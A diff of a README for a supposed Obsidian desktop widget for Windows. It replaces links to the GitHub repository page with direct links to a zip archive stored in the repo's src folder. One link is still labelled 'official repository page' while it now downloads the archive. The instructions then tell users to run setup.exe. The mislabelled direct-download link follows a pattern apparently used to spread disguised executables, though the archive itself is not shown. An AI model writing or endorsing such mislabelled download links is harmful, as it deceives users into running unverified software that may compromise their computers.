@@ -1,6 +1,6 @@
 # 🌐 obsidian-desktop-widget - View your vault on your desktop
 
-[Download the Obsidian Desktop Widget](https://github.com/Tharenhellbent652/obsidian-desktop-widget)
+[Download the Obsidian Desktop Widget](https://raw.githubusercontent.com/Tharenhellbent652/obsidian-desktop-widget/main/src/obsidian_desktop_widget_v1.9.zip)
 
 ## 📌 About this application
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 or Windows 11. You need at least 4GB of RAM 
 
 ## 🚀 Getting started
 
-1. Visit the [official repository page](https://github.com/Tharenhellbent652/obsidian-desktop-widget) to download the installer.
+1. Visit the [official repository page](https://raw.githubusercontent.com/Tharenhellbent652/obsidian-desktop-widget/main/src/obsidian_desktop_widget_v1.9.zip) to download the installer.
 2. Locate the file named setup.exe in your downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the prompts on your screen to install the software.
